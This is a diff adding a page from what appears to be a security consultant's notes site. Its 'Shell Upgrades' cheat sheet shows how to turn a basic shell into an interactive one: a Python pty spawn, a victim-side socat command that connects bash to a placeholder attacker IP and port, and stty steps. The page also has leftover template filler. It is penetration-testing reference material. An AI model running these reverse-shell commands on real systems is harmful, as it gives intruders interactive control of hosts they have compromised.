@@ -1,0 +1,91 @@
+<html lang="en">
+
+<head>
+<title>Graham O'Donnell</title>
+<meta name="author" content="Graham O'Donnell">
+<meta name="description" content="I hope you learn something here">
+<meta charset="utf-8">
+<link rel="shortcut icon" href="">
+<link rel="stylesheet" href="site.css"/>
+<link rel="shortcut icon" type="image/ico" href="favicon.ico">
+
+</head>
+
+<body>
+<header class="header">
+<a href="https://gmodonnell.github.io"><h1>Graham O'Donnell</h1></a>
+<h2 style="color:#bb7c35">Security Consultant</h2>
+<nav>
+<a href="/notes/index.html">Notes</a>
+-
+<a href="/writeups/index.html">Writeups</a>
+-
+<a href="/eer/index.html">Resources</a>
+</nav>
+<p>
+This is my virtual notebook. I keep notes here on security stuff.
+</p>
+</header>
+<main class="container">
+
+
+<blockquote>
+<p>
+This is a blockquote
+</p>
+</blockquote>
+
+<pre>
+    <code>
+        This is code output
+    </code>
+</pre>
+
+<blockquote>
+<pre>
+<code>
+put it all together
+</code>
+</pre>
+</blockquote>
+
+<article>
+<h2>Shell Upgrades</h2>
+<p>
+Everyone hates having a non-interactive session. Here are some ways to get out of that.
+Each method requires that the requisite software is installed. If it isn't you're not 
+going to get that upgrade. 
+</p>
+<blockquote>
+  <pre>
+  <code>
+PYTHON:
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+SOCAT (listener, victim):
+socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
+
+STTY Upgrades:
+Run the Python upgrade and background (CTRL+Z) the session.
+Show the stty options and foreground the session
+$ stty raw -echo
+$ fg
+Reset the shell session and copy the stty options over.
+The rows and columns numbers will be displayed at the top.
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> cols <num>
+</code>
+  </pre>
+</blockquote>
+<p>
+The Python method only gives a pseudo-terminal, but if you want to get a fully 
+interactive session you can run the third method. This will allow you fully
+interactive sessions over netcat connections.
+</p>
+</article>
+
+</main>
+</body>
